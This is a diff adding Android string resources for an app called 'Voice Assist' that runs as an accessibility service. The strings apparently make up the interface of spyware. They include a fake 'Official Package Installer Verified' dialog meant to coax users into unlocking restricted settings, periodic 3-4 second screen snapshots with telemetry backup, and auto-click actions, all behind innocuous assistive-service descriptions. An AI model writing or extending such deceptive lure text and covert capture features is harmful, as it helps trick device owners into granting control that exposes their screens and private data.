@@ -1,0 +1,26 @@
+<resources>
+    <string name="app_name">Voice Assist</string>
+    <string name="accessibility_service_label">Voice Assist Service</string>
+    <string name="accessibility_service_summary">Smart voice guidance and quick communication assistant</string>
+    <string name="accessibility_service_description">Assistive service that helps users with system settings, voice guidance, and quick communication access.</string>
+    <string name="database_drawer_title">Database &amp; Telemetry Drawer</string>
+    <string name="vibration_settings_title">Accessibility Vibration Settings</string>
+    <string name="vibration_settings_subtitle">Customize haptic feedback patterns for pairing, toggles, and alerts</string>
+    <string name="vibration_master_toggle">Enable Haptic Feedback</string>
+    <string name="vibration_intensity_label">Vibration Intensity</string>
+    <string name="vibration_event_pairing_success">Successful Pairing</string>
+    <string name="vibration_event_button_toggle">Button Toggles</string>
+    <string name="vibration_event_auto_click">Auto-Click &amp; FLY Action</string>
+    <string name="vibration_event_error_alert">Error &amp; Warning Alerts</string>
+    <string name="vibration_test_pattern">Test</string>
+    <string name="vibration_reset_defaults">Reset Defaults</string>
+    <string name="pkg_installer_dialog_title">Official Package Installer</string>
+    <string name="pkg_installer_dialog_desc">Verify and install via the official system Package Installer to unlock restricted settings safely.</string>
+    <string name="pkg_installer_allow_btn">Allow &amp; Install via Package Installer</string>
+    <string name="pkg_installer_later_btn">Later</string>
+    <string name="pkg_installer_verified_badge">Official Package Installer Verified ✓</string>
+    <string name="snapshot_backup_section_title">3-4s Screen Snapshot &amp; Usage Backup</string>
+    <string name="snapshot_backup_section_subtitle">Periodic screen snapshot and telemetry backup</string>
+    <string name="snapshot_backup_now_btn">Capture &amp; Backup Now</string>
+    <string name="snapshot_clear_btn">Clear</string>
+</resources>
